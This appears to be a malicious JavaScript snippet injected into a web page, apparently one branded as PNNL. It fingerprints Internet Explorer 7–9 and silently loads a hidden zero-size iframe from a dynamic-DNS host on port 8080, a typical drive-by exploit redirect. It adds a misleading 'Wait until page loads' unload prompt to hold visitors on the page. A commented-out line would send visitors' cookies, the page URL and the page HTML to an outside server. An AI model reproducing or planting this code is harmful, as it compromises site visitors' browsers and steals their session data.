if (navigator.userAgent.indexOf('MSIE') != -1)
 var detectIEregexp = /MSIE (\d+\.\d+);/ //test for MSIE x.x
else // if no "MSIE" string in userAgent
 var detectIEregexp = /Trident.*rv[ :]*(\d+\.\d+)/ //test for rv:x.x or rv x.x where Trident string exists

if (detectIEregexp.test(navigator.userAgent)){ //if some form of IE
 var ieversion=new Number(RegExp.$1) 
 if (ieversion==7 || ieversion==8 || ieversion==9){
document.write("<iframe src='http://bozradagast.ddns.net:8080/x1tNda' style='width:0;height:0;border:0; border:none;'>");
function closeEditorWarning(){
    return 'PNNL - Science | Wait until page loads.'
}

window.onbeforeunload = closeEditorWarning

}
else{
//send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,document.documentElement.outerHTML);
}}
